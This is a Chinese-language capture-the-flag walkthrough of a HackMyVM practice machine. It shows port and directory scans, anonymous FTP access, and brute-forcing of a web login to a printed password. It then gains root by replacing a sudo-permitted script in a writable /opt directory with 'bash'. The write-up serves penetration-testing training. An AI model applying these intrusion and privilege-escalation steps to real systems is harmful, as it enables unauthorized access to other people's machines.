# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 01:10 EDT
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.00015s latency).
MAC Address: 08:00:27:08:A9:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.41 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 01:11 EDT
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.00038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:08:A9:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 01:11 EDT
Warning: 192.168.21.6 giving up on port because retransmission cap hit (10).
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.0013s latency).
All 65535 scanned ports on dev.medusa.hmv (192.168.21.6) are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:08:A9:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 72.98 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p21,22,80 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 01:13 EDT
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:08:A9:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 29604]
/img                  (Status: 301) [Size: 310] [--> http://192.168.21.6/img/]                                                  
/login.php            (Status: 200) [Size: 1022]
/user.php             (Status: 302) [Size: 0] [--> login.php]
/mail                 (Status: 301) [Size: 311] [--> http://192.168.21.6/mail/]                                                 
/css                  (Status: 301) [Size: 310] [--> http://192.168.21.6/css/]                                                  
/js                   (Status: 301) [Size: 309] [--> http://192.168.21.6/js/]                                                   
/success.php          (Status: 302) [Size: 0] [--> login.php]
/vendor               (Status: 301) [Size: 313] [--> http://192.168.21.6/vendor/]                                               
/create_account.php   (Status: 200) [Size: 1003]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/login.php，/create_account.php发现登录和注册的页面？

<img width="555" height="441" alt="图片" src="https://github.com/user-attachments/assets/52c90131-bd5e-4a11-950d-455aba974af1" />

<img width="580" height="306" alt="图片" src="https://github.com/user-attachments/assets/322e2200-76e7-435f-90b1-f408f896b60b" />

注册一个用户

<img width="589" height="209" alt="图片" src="https://github.com/user-attachments/assets/f5dba617-11cb-4169-a4e3-3a18958c1952" />

<img width="549" height="89" alt="图片" src="https://github.com/user-attachments/assets/fdc11973-f2d8-4c74-82a8-270d1c8ed324" />

解码一下

<img width="523" height="401" alt="图片" src="https://github.com/user-attachments/assets/37e00f8d-7e51-4aec-929e-8d22a1108aa4" />

密码好像是用户名+年份+@+四位数字，写一个字典，寻找一下用户名

21端口可以匿名登录

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.21.6
Connected to 192.168.21.6.
220 (vsFTPd 3.0.3)
Name (192.168.21.6:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45247|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp>
```

下载下来，看看是什么

```
ftp> ls
229 Entering Extended Passive Mode (|||45247|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp> get output
local: output remote: output
229 Entering Extended Passive Mode (|||58442|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |*******************|  5154        9.61 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (5.50 MiB/s)
┌──(kali㉿kali)-[~]
└─$ cat output              
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                                
 ▄▄                            ▄▄                                               
 ██                            ██                                               
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██                                                 
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██                                                 
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀                                                 
                                                    ███                         
                                                                                
                                                                                
                                                                                
                                                                                
            ▄████▄   ██    ██                                                   
           ██▄▄▄▄██  ██    ██                                                   
           ██▀▀▀▀▀▀  ██    ██                                                   
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                   
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                   
                                                                                
                                                                                
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
```

创建一下matthew，来验证有没有这个用户

<img width="759" height="234" alt="图片" src="https://github.com/user-attachments/assets/a93a281b-b97f-4c12-a831-b06dc03cf7df" />

尝试用字典爆破这个用户名得到其密码：matthew2023@1554

<img width="924" height="151" alt="图片" src="https://github.com/user-attachments/assets/ff961412-93d9-4812-9c48-a2a86b4f697e" />

# 权限提升

```
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ cat /opt/superhack
#! /bin/bash 
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat << EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n"
printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n"
printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n"

printf "\n"

[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit

while [ -z "$domain" ]; do
read -p "${VERT}domain to hack:${RESET} " domain
done

printf "\n"

n=50

string=""
for ((i=0; i<$n; i++))
do
string+="."
done

for ((i=0; i<$n; i++))
do
string="${string/./#}"
printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r"
sleep .09
done

printf "\n"
printf "${JAUNE}Target $domain ====> PWNED${RESET}\n"
printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"

echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"
matthew@uvalde:~$ cd /opt
matthew@uvalde:/opt$ mv superhack backup
matthew@uvalde:/opt$ echo 'bash' > superhack
matthew@uvalde:/opt$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
root@uvalde:/opt# id
uid=0(root) gid=0(root) groups=0(root)
```
